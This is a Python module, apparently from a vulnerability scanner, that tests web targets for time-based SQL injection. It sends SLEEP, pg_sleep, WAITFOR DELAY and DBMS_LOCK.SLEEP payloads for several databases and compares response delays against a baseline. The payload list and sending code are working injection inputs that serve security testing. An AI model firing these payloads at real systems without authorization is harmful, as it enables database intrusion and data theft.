"""
時間檢測引擎 - 基於時間延遲的SQL注入檢測
"""



import asyncio
import time

import httpx

from services.aiva_common.schemas import FunctionTaskPayload
from services.aiva_common.utils import get_logger

from ..detection_models import DetectionResult
from ..payload_wrapper_encoder import PayloadWrapperEncoder

logger = get_logger(__name__)


class TimeDetectionEngine:
    """時間檢測引擎 - 檢測基於時間延遲的SQL注入"""

    def __init__(self):
        self.time_payloads = {
            "mysql": [
                "'; SELECT SLEEP(5); --",
                "' OR SLEEP(5) --",
                "'; WAITFOR DELAY '00:00:05'; --",
                "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND SLEEP(5) --",
            ],
            "postgresql": [
                "'; SELECT pg_sleep(5); --",
                "' OR pg_sleep(5) IS NULL --",
                "'; SELECT * FROM pg_sleep(5); --",
            ],
            "mssql": [
                "'; WAITFOR DELAY '00:00:05'; --",
                "' OR 1=1; WAITFOR DELAY '00:00:05'; --",
                "'; IF (1=1) WAITFOR DELAY '00:00:05'; --",
            ],
            "oracle": [
                "'; SELECT * FROM DUAL WHERE 1=1 AND DBMS_LOCK.SLEEP(5) IS NULL; --",
                "' OR 1=1 AND DBMS_LOCK.SLEEP(5) IS NULL --",
            ],
            "generic": [
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --",
                "'; SELECT 1 FROM dual WHERE 1=1 AND 1<(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3)a WHERE 1=1 AND SLEEP(5)); --",
            ],
        }
        self.delay_threshold = 3.0  # 延遲閾值（秒）
        self.max_baseline_time = 2.0  # 基準請求最大時間

    async def detect(
        self, task: FunctionTaskPayload, client: httpx.AsyncClient
    ) -> list[DetectionResult]:
        """執行時間檢測"""
        results: list[DetectionResult] = []
        encoder = PayloadWrapperEncoder(task)

        logger.debug(f"Starting time-based detection for task {task.task_id}")

        # 測量基準回應時間
        baseline_times = await self._measure_baseline_times(
            task, client, encoder, samples=3
        )
        if not baseline_times:
            logger.warning("Failed to establish baseline timing")
            return results

        avg_baseline = sum(baseline_times) / len(baseline_times)
        logger.debug(f"Baseline response time: {avg_baseline:.2f}s")

        # 如果基準時間太長，跳過時間檢測
        if avg_baseline > self.max_baseline_time:
            logger.warning(
                f"Baseline time too high ({avg_baseline:.2f}s), skipping time-based detection"
            )
            return results

        # 測試時間載荷
        for db_type, payloads in self.time_payloads.items():
            for payload in payloads:
                try:
                    # 測量載荷回應時間
                    payload_time = await self._measure_payload_time(
                        payload, encoder, client
                    )

                    if payload_time is None:
                        continue

                    # 檢查是否存在顯著延遲
                    delay = payload_time - avg_baseline
                    if delay >= self.delay_threshold:
                        result = self._build_detection_result(
                            payload=payload,
                            db_type=db_type,
                            baseline_time=avg_baseline,
                            payload_time=payload_time,
                            task=task,
                        )
                        results.append(result)
                        logger.info(
                            f"Time-based SQL injection detected: {db_type} with {delay:.2f}s delay"
                        )

                except Exception as e:
                    logger.warning(
                        f"Time detection failed for payload '{payload}': {e}"
                    )
                    continue

        logger.debug(
            f"Time-based detection completed. Found {len(results)} vulnerabilities"
        )
        return results

    async def _measure_baseline_times(
        self,
        task: FunctionTaskPayload,
        client: httpx.AsyncClient,
        encoder: PayloadWrapperEncoder,
        samples: int = 3,
    ) -> list[float]:
        """測量基準回應時間"""
        times = []
        for _ in range(samples):
            try:
                start_time = time.time()
                encoded = encoder.encode("")  # 空載荷
                response = await client.request(
                    method=encoded.method, url=encoded.url, **encoded.request_kwargs
                )
                end_time = time.time()

                if response.status_code < 500:  # 排除伺服器錯誤
                    times.append(end_time - start_time)

                # 在測量間稍作等待
                await asyncio.sleep(0.1)

            except Exception as e:
                logger.warning(f"Failed to measure baseline time: {e}")
                continue

        return times

    async def _measure_payload_time(
        self, payload: str, encoder: PayloadWrapperEncoder, client: httpx.AsyncClient
    ) -> float | None:
        """測量載荷回應時間"""
        try:
            start_time = time.time()
            encoded = encoder.encode(payload)
            response = await client.request(
                method=encoded.method, url=encoded.url, **encoded.request_kwargs
            )
            end_time = time.time()

            # 只有成功的回應才計算時間
            if response.status_code < 500:
                return end_time - start_time

        except Exception as e:
            logger.warning(f"Failed to measure payload time for '{payload}': {e}")

        return None

    def _build_detection_result(
        self,
        payload: str,
        db_type: str,
        baseline_time: float,
        payload_time: float,
        task: FunctionTaskPayload,
    ) -> DetectionResult:
        """構建檢測結果"""
        from services.aiva_common.enums import Confidence, Severity, VulnerabilityType
        from services.aiva_common.schemas import (
            FindingEvidence,
            FindingImpact,
            FindingRecommendation,
            FindingTarget,
            Vulnerability,
        )

        delay = payload_time - baseline_time
        confidence = min(0.9, delay / 5.0)  # 延遲越長信心越高

        vulnerability = Vulnerability(
            name=VulnerabilityType.SQLI,
            severity=Severity.HIGH,
            confidence=Confidence.FIRM if confidence > 0.7 else Confidence.POSSIBLE,
        )

        evidence = FindingEvidence(
            payload=payload,
            request=f"Payload: {payload}",
            response=(
                f"Baseline time: {baseline_time:.2f}s, "
                f"Payload time: {payload_time:.2f}s, Delay: {delay:.2f}s"
            ),
            proof=(
                f"The time-based payload '{payload}' caused a {delay:.2f}s "
                f"delay, indicating SQL injection vulnerability in {db_type} "
                f"database."
            ),
            db_version=db_type,
        )

        impact = FindingImpact(
            description=(
                "Time-based SQL injection allows attackers to extract data "
                "through time-based queries."
            ),
            business_impact=(
                "High - potential for complete data extraction via time-based attacks"
            ),
        )

        recommendation = FindingRecommendation(
            fix=(
                "Implement parameterized queries and disable database delay "
                "functions. Conduct comprehensive security audit and "
                "implement query timeout controls."
            ),
            priority="High",
        )

        target = FindingTarget(
            url=task.target.url,
            method=task.target.method,
            parameter=task.target.parameter,
        )

        return DetectionResult(
            is_vulnerable=True,
            vulnerability=vulnerability,
            evidence=evidence,
            impact=impact,
            recommendation=recommendation,
            target=target,
            detection_method="time_based",
            payload_used=payload,
            confidence_score=confidence,
        )
